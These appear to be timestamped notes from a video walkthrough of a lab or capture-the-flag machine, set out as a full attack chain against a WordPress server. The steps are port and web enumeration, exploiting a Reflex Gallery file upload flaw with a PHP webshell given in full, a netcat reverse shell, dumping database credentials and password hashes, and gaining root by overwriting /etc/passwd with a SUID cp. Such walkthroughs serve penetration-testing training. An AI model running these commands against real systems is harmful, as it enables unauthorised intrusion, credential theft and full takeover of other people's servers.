Exporting IP and URL for the target machine [00:26]

export IP=<target_IP>

export URL=http://<target_IP>:80 (assuming port 80)

export URL_FUZZ=http://<target_IP>:80/FUZZ (for Wfuzz)

Nmap Scan for Open Ports and Services [00:50]

nmap -p- -sV -sC $IP --open

-p-: Scans all 65,535 TCP ports.

-sV: Detects service versions on open ports.

-sC: Runs default Nmap scripts for further enumeration.

--open: Shows only open ports, speeding up the scan.

Lesson: Only Port 80 was open, indicating that the initial focus should be on web enumeration [01:38].

Identified OS: Ubuntu [02:00]

Identified Web Server: Apache2 2.4.29 (Ubuntu) with a default "It works!" page [02:06].

Web Enumeration (Port 80)
Wfuzz for File Fuzzing [03:30]

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL_FUZZ"

-c: Use colorized output.

-z file,...: Specifies the wordlist for fuzzing.

--hc 404: Hides HTTP 404 (Not Found) responses.

"$URL_FUZZ": Uses the exported URL with FUZZ keyword.

Discovered File: info.php [04:16]

Lesson: info.php initially just showed the IP address [05:02]. This might suggest checking for hidden parameters or further enumeration on this specific file.

Wfuzz for Directory Fuzzing [06:15]

export URL="http://<target_IP>:80/" (add trailing slash for directories)

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL_FUZZ"

Discovered Directory: /wordpress [07:05]

Lesson: Finding a /wordpress directory immediately flags it as the primary attack vector [08:12].

WPScan for WordPress Enumeration [08:42]

export URL="http://<target_IP>:80/wordpress/"

wpscan --url "$URL" --enumerate u --enumerate t -v (to enumerate users and themes verbosely) [08:52]

wpscan --url "$URL" --enumerate p -v (to enumerate plugins verbosely) [10:26]

Discovered Users: admin, aarti [09:40]

Discovered Vulnerable Plugin: reflex-gallery version 3.1.3 (out of date, latest is 3.1.7) [12:01]

Lesson: WPScan is essential for WordPress reconnaissance, revealing usernames, outdated themes/plugins, and directory listings like /wp-content/uploads/ [10:47].

Lesson: Prioritize plugins marked as "out of date" or with known vulnerabilities [12:54].

Searchsploit for Reflex Gallery Vulnerability [13:10]

searchsploit reflex-gallery (initially no results) [13:25]

searchsploit "reflex gallery" (corrected search) [13:36]

Discovered Exploit: WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload [13:44]

Lesson: Be aware of keyword exactness when using searchsploit; sometimes slight variations are needed.

Arbitrary File Upload Exploit (Reflex Gallery) [14:01]

Use the bringmeit.sh script (or manually copy) the exploit to your current directory: bringmeit.sh php/webapps/36374.txt [14:01]

Create an HTML file (offsec.html) with a form to upload a PHP webshell [15:01].

The exploit specifies a path like /wordpress/wp-content/plugins/reflex-gallery/admin/scripts/file_uploader.php and expects year and month parameters.

Lesson: File upload vulnerabilities often involve parameters like year/month or specific directory structures for where the file will be uploaded [17:42].

Create a simple PHP webshell (cmd.php) that executes commands via a GET parameter:
<?php echo "<pre>"; passthru($_GET['cmd']); echo "</pre>"; ?> [16:43]

Navigate to the offsec.html file in your browser (firefox offsec.html) [16:29].

Upload cmd.php through the form, ensuring the year and month parameters match an existing or newly created directory (e.g., 2015 and 03 from the exploit, or 2021 and 11 from observed uploads directory) [17:53, 19:10].

Lesson: If the exploit creates a directory, ensure your upload parameters match. If it fails, check existing directories in /wp-content/uploads/ and try uploading to one of those [18:12, 19:55].

Access the uploaded webshell in the browser: http://<target_IP>/wordpress/wp-content/uploads/<year>/<month>/cmd.php?cmd=id [20:26]

Lesson: Successfully accessing the webshell with ?cmd=id confirms remote code execution as www-data [20:55].

Gaining a Shell and Privilege Escalation
Netcat Reverse Shell [21:09]

Set up a Netcat listener on your attacking machine: nc -nvlp 1 (or any chosen port, port 1 was used in the video) [22:22].

Generate a bash reverse shell payload.

Wrap the payload in bash -c "..." and URL encode it using a tool like urlencode (or mayerweb.com) [21:37, 22:02].

Execute the URL-encoded payload through the webshell: http://<target_IP>/wordpress/wp-content/uploads/2021/11/cmd.php?cmd=<URL_ENCODED_PAYLOAD> [22:35]

Stabilizing the Shell [22:45]

Check for TTY: tty (will indicate not a tty)

Identify Python3 presence: which python3 [22:52]

Import a Python3 TTY shell: python3 -c 'import pty; pty.spawn("/bin/bash")' [23:04]

Export paths: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin [23:13]

Export TERM for color functionality: export TERM=xterm-256color [23:16]

Alias ll for clear screen and detailed listing: alias ll='clear; ls -lsah --color=auto' [23:18]

Gain job control and a stable shell:

Ctrl+Z (to background the current shell)

stty raw -echo

fg (to bring the shell back to foreground)

stty columns 200 rows 200 (adjust rows/columns as needed) [23:22, 23:29]

Lesson: A stable shell with job control is vital for efficient post-exploitation and running various tools without losing your connection [23:50].

Post-Exploitation Enumeration (Initial Checks) [23:57]

Check home directories for users: ls -la /home (user raj found with user.txt flag) [24:01]

Check wp-config.php for database credentials: cat /var/www/html/wordpress/wp-config.php [24:40]

Discovered Credentials: Database user raj, password 123 [24:59]

Accessing MySQL with Discovered Credentials [25:09]

mysql -u raj -p (then enter 123 as password)

show databases;

use wordpress;

show tables;

select * from wp_users; (to get WordPress user hashes) [25:45]

Lesson: Always check wp-config.php for database credentials. Reusing these credentials across services is a common vulnerability.

Identify Hash Type: hash-identifier (then paste hash) [26:17]

Lesson: The WordPress hashes are MD5 [26:22].

World-writable directories: /var/tmp, /tmp, /dev/shm (nothing immediately useful) [26:37]

Mounts and fstab: cat /etc/fstab, mount (nothing exotic) [26:53]

Sensitive files in /etc: ls -la /etc (look for non-root permissions) [27:10]

Cron jobs: ls -la /etc/cron*, ps aux | grep -i 'cron' --color=auto (nothing immediately useful) [28:12]

Running processes as root: ps aux | grep -i 'root' --color=auto [27:35]

Network status: netstat -tunlp (look for internal services on 127.0.0.1) [28:48]

Privilege Escalation via SUID Binary (CP) [29:36]

Identify SUID binaries: find / -perm -u=s -type f 2>/dev/null [29:41] (Identified /bin/cp)

Exploiting SUID cp: The cp (copy) command is running as root with SUID permissions. This means any file copied by cp will be owned by root.

Create a malicious /etc/passwd entry with a known root-level password:

nano /var/tmp/passwd

Add a new root-equivalent user (e.g., siren) with a known password (e.g., iheart_hacking as an OpenSSL generated hash) to the /var/tmp/passwd file [31:30].

Example entry: siren:<hash_of_iheart_hacking>:0:0:root:/root:/bin/bash

Copy the malicious passwd file over the legitimate one using the SUID cp binary:

cp /var/tmp/passwd /etc/passwd [32:27]

Switch user to the new root account: su siren (then enter iheart_hacking) [32:51]

Verify root access: whoami, id [32:58, 33:18]

Capture Proof: cat /root/proof.txt, ifconfig, hostname, id [33:11, 33:18]

Lesson: Misconfigured SUID binaries, especially common utilities like cp, mv, or chown, can be exploited to gain root privileges by overwriting sensitive system files [30:48].